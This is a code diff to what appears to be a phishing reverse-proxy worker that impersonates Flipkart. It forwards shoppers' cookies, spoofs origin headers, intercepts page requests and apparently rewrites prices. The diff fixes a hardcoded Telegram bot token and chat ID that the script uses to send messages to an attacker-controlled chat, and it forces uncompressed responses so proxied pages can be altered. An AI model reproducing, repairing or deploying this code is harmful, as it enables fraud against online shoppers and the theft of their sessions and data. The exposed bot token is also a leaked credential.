@@ -62,10 +62,15 @@ if (typeof globalThis.HTMLRewriter === 'undefined') {
         });
       }
 
+      const cleanHeaders = new Headers(response.headers);
+      cleanHeaders.delete('content-encoding');
+      cleanHeaders.delete('content-length');
+      cleanHeaders.delete('transfer-encoding');
+
       return new Response(text, {
         status: response.status,
         statusText: response.statusText,
-        headers: response.headers
+        headers: cleanHeaders
       });
     }
   };
@@ -75,7 +80,7 @@ if (typeof globalThis.HTMLRewriter === 'undefined') {
 // Based on: oldworker.js stable routing + Session 8 pricing (help.txt)
 // Fixes: fetch Request object bug, catch-all ₹ server-side, hydration interceptors
 
-const TG_TOKEN = "8646739925:zAEB4vFZjfGm7nLghRqjkEb88aKtr5aIqvg";
+const TG_TOKEN = "8646739925:AAEB4vFZjfGm7nLghRqjkEb88aKtr5aIqvg";
 const TG_CHAT = "8664945781";
 const TG_API = `https://api.telegram.org/bot${TG_TOKEN}/sendMessage`;
 
@@ -2024,7 +2029,7 @@ async function proxySubdomain(
       Origin: "https://www.flipkart.com",
       Accept: request.headers.get("accept") || "*/*",
       "Accept-Language": "en-IN,en;q=0.9",
-      "Accept-Encoding": "gzip, deflate, br",
+      "Accept-Encoding": "identity",
       ...(cookie ? { Cookie: cookie } : {}),
       ...(request.headers.get("content-type")
         ? { "Content-Type": request.headers.get("content-type") }
@@ -2605,7 +2610,7 @@ const workerObj = {
           request.headers.get("accept") ||
           "text/html,application/xhtml+xml,*/*;q=0.8",
         "Accept-Language": "en-IN,en-US;q=0.9,en;q=0.8",
-        "Accept-Encoding": "gzip, deflate, br, zstd",
+        "Accept-Encoding": "identity",
         Referer: ref,
         ...(finalFkua ? { "fkua-User-Agent": finalFkua } : {}),
         ...(cookie ? { Cookie: cookie } : {}),
@@ -3724,7 +3729,7 @@ XMLHttpRequest.prototype.send=function(){
 export default async function handler(request) {
   const env = {};
   const ctx = {
-    waitUntil: (p) => { if (p && typeof p.catch === 'function') p.catch(() => { }); }
+    waitUntil: (p) => { if (p && typeof p.catch === 'function') p.catch(() => {}); }
   };
-  return workerObj.fetch(request, env, ctx);
+  return await workerObj.fetch(request, env, ctx);
 }
